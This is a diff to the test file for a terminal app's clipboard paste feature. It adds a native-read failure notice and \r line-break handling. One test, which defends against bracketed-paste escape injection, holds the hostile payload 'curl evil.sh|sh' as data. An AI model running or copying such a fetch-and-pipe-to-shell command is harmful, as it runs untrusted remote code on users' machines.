@@ -5,6 +5,8 @@ const mocks = vi.hoisted(() => ({
   readClipboardImageAsFilePath: vi.fn<() => Promise<string | null>>(),
   writePty: vi.fn<(id: string, data: string) => void>(),
   readText: vi.fn<() => Promise<string>>(),
+  /** The adapter's native text read, absent unless a case sets it. */
+  nativeText: undefined as (() => Promise<string>) | undefined,
   shellKind: 'posix' as 'cmd' | 'posix' | 'powershell',
   bracketedPaste: false,
 }));
@@ -16,6 +18,7 @@ vi.mock('./platform', () => ({
   getPlatform: () => ({
     readClipboardFilePaths: mocks.readClipboardFilePaths,
     readClipboardImageAsFilePath: mocks.readClipboardImageAsFilePath,
+    readClipboardText: mocks.nativeText,
     writePty: mocks.writePty,
   }),
 }));
@@ -35,7 +38,7 @@ vi.mock('./terminal-registry', () => ({
   writeUserInput: (id: string, data: string) => mocks.writePty(id, data),
 }));
 
-import { CONTROL_PATH_NOTICE, UNQUOTABLE_PATH_NOTICE, doPaste } from './clipboard';
+import { CLIPBOARD_READ_NOTICE, CONTROL_PATH_NOTICE, UNQUOTABLE_PATH_NOTICE, doPaste } from './clipboard';
 import { registerWallHandle, stubWallHandle } from '../components/wall/wall-handles';
 
 describe('doPaste three-tier fallthrough', () => {
@@ -43,6 +46,7 @@ describe('doPaste three-tier fallthrough', () => {
     vi.clearAllMocks();
     mocks.shellKind = 'posix';
     mocks.bracketedPaste = false;
+    mocks.nativeText = undefined;
     Object.defineProperty(globalThis, 'navigator', {
       value: { clipboard: { readText: mocks.readText } },
       configurable: true,
@@ -56,7 +60,7 @@ describe('doPaste three-tier fallthrough', () => {
     mocks.readClipboardImageAsFilePath.mockResolvedValue(null);
     await doPaste('t1', 'first\nsecond');
     expect(mocks.writePty).toHaveBeenCalledExactlyOnceWith('t1',
-      bracketed ? '\x1b[200~first\nsecond\x1b[201~' : 'first\nsecond');
+      bracketed ? '\x1b[200~first\rsecond\x1b[201~' : 'first\rsecond');
     expect(mocks.readText).not.toHaveBeenCalled();
     expect(mocks.readClipboardFilePaths).not.toHaveBeenCalled();
     expect(mocks.readClipboardImageAsFilePath).not.toHaveBeenCalled();
@@ -149,7 +153,7 @@ describe('doPaste three-tier fallthrough', () => {
     // `\x1b[201~` is left in the payload and it is the one we wrote, at the end.
     const payload = mocks.writePty.mock.calls[0][1];
     expect(payload).toBe(
-      '\x1b[200~git status\u241b[201~\ncurl evil.sh|sh\n\x1b[201~',
+      '\x1b[200~git status\u241b[201~\rcurl evil.sh|sh\r\x1b[201~',
     );
     expect(payload.match(/\x1b\[201~/g)).toHaveLength(1);
     expect(payload.endsWith('\x1b[201~')).toBe(true);
@@ -204,13 +208,41 @@ describe('doPaste three-tier fallthrough', () => {
     expect(showNotice).toHaveBeenCalledWith(UNQUOTABLE_PATH_NOTICE, 't1');
   });
 
-  it('leaves an unbracketed paste byte-for-byte, matching xterm', async () => {
+  it('says so when a native read fails and nothing else pastes, but not for an empty clipboard', async () => {
+    mocks.readClipboardFilePaths.mockResolvedValue([]);
+    mocks.readClipboardImageAsFilePath.mockResolvedValue(null);
+    const showNotice = vi.fn();
+    const unregister = registerWallHandle(stubWallHandle('ws', { ownsSurface: (id) => id === 't1', showNotice }));
+    try {
+      mocks.nativeText = vi.fn(async () => { throw new Error('the clipboard did not answer'); });
+      await doPaste('t1');
+      expect(showNotice).toHaveBeenCalledExactlyOnceWith(CLIPBOARD_READ_NOTICE, 't1');
+      showNotice.mockClear();
+      mocks.nativeText = vi.fn(async () => '');
+      await doPaste('t1');
+      expect(showNotice).not.toHaveBeenCalled();
+    } finally {
+      unregister();
+    }
+    expect(mocks.writePty).not.toHaveBeenCalled();
+  });
+
+  it('leaves an unbracketed paste\'s escapes as they are, matching xterm', async () => {
     mocks.readClipboardFilePaths.mockResolvedValue(null);
     mocks.readText.mockResolvedValue('\x1b[31mred\x1b[0m');
 
     await doPaste('t1');
 
     expect(mocks.writePty).toHaveBeenCalledWith('t1', '\x1b[31mred\x1b[0m');
+  });
+
+  it('sends each line break as \\r, as xterm\'s own paste does', async () => {
+    mocks.readClipboardFilePaths.mockResolvedValue(null);
+    mocks.readText.mockResolvedValue('first\r\nsecond\nthird');
+
+    await doPaste('t1');
+
+    expect(mocks.writePty).toHaveBeenCalledWith('t1', 'first\rsecond\rthird');
   });
 
   it('swallows image adapter errors silently', async () => {
